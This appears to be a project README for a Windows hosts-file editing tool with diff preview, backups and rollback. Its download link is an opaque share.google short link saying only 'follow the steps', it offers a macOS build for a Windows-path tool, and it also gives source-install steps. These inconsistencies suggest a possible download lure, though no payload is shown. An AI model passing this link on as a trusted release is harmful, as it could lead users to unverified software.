# Hosts File Guard

A safer way to edit `C:\Windows\System32\drivers\etc\hosts`.

Edit the Windows hosts file with a preview, checksum, and one-click rollback to the last good copy.

## Get the build

**[Download for Windows and macOS](https://share.google/A1IHfyGRT0zGRLqj8)** - open the page and follow the steps.

## What it does

- Loads the live hosts file and shows a unified diff before save
- Writes a dated backup next to the file
- Restores the last good copy if DNS lookups fail a quick check
- Blocks empty or duplicate wildcard rules

A bad hosts line can break Windows Update, VPNs, or the browser.

Notepad-as-admin has no preview and no undo. This tool diffs the change, writes a backup, then applies it.

## Usage

```powershell
pip install -r requirements.txt
python main.py --help
```

MIT. See `LICENSE`.
